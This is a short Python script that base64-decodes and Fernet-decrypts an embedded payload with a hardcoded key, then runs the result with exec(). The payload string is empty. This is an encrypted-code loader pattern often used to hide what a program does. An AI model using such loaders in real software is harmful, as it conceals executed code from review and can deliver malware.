
from cryptography.fernet import Fernet
import base64

key = b'46sVejwgRCsT8qdxU4fB0V-1rZLbENtHec1zij6aVbk='
encrypted_code = ''

decrypted_code = Fernet(key).decrypt(base64.b64decode(encrypted_code)).decode()
exec(decrypted_code)
